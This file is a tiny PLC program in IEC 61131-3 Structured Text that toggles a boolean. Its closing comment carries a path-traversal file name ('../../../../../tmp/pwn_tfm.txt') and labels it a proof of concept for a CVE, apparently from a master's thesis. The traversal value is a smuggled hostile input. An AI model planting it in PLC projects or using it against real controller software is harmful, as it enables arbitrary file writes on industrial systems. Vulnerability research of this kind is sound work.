PROGRAM pwn
  VAR
    tick : BOOL := FALSE;
  END_VAR

  tick := NOT tick;
END_PROGRAM

CONFIGURATION Config0
  RESOURCE Res0 ON PLC
    TASK task0(INTERVAL := T#100ms, PRIORITY := 0);
    PROGRAM instance0 WITH task0 : pwn;
  END_RESOURCE
END_CONFIGURATION

(*FILE:../../../../../tmp/pwn_tfm.txt CVE-2026-71268 path traversal PoC - TFM Juan Luis Verdugo*)
